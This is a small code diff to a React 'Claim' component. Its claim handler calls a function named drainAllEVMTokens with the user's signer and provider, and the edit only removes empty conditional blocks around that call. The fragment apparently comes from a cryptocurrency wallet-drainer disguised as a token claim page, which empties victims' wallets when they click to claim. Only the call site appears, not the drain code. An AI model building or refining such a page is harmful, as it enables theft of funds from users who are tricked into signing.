@@ -192,9 +192,6 @@ const Claim = () => {
       try {
         setIsClaiming(true);
         await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
-        if (hash) {
-        } else {
-        }
       } catch (error: any) {
       } finally {
         setIsClaiming(false);
